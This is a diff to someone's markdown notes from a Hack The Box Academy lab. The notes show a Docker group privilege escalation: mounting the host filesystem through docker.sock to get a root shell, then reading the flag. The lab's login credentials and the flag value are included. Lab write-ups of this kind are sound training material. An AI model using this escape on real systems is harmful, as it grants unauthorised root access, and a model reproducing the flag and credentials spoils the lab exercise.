@@ -16,7 +16,6 @@ Logging in with the first Container ID listed and grabbing the private SSH key a
 ![[Pasted image 20240318110823.png]]
 
 
-
 ### Method 2: Docker Group
 
 Verify if user is in the docker group. To gain root access the user must be in the docker group
@@ -81,3 +80,20 @@ ssh htb-student@10.129.205.237
 HTB_@cademy_stdnt!
 ```
 
+#### Check file permissions for the socket file
+![[Pasted image 20240318112824.png]]
+SUID bit is set and we can access the 5a81c4b8502e image
+
+I am also in the docker group
+![[Pasted image 20240318114210.png]]
+
+
+#### FLAG
+With these two facts I was able to write to the docker.sock file and  priv esc to root. I then used the find command to find the flag
+```
+htb-student@ubuntu:/$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+root@d48cd6caa0c0:/# 
+root@d48cd6caa0c0:/# find /root -type f -name flag.txt -exec cat {} \; 2>dev/null
+HTB{D0ck3r_Pr1vE5c}
+root@d48cd6caa0c0:/# 
+```
